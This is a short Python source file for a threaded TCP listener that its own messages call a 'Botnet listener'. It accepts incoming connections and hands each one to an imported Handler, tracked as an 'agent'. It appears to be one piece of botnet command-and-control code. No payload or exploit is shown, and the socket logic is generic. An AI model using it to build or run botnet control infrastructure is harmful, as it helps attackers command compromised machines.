# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time

from handler import Handler

class Listener_TCP(threading.Thread):
    def __init__(self, lhost, lport, agentList):
        threading.Thread.__init__(self)
        self.lhost = lhost
        self.lport = lport
        self.agentList = agentList

    def run(self):

        # Initial socket setup
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_address = (self.lhost, self.lport)
        server.bind(server_address)
        server.listen(100)

        print(f"[* Listener-Msg] Starting Botnet listener on tcp://{self.lhost}:{str(self.lport)}\n")

        connRecord = 0                                         # Records Connection ID

        while True:

            (client, client_address) = server.accept()  # start listening
            print(f"\n[* Listener-Msg] Connection received from {str(client_address[0])}\n")

            # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
            newConn = Handler(client, client_address, connRecord)
            newConn.start()

            self.agentList.append(newConn)
            # print(agentList)
            connRecord += 1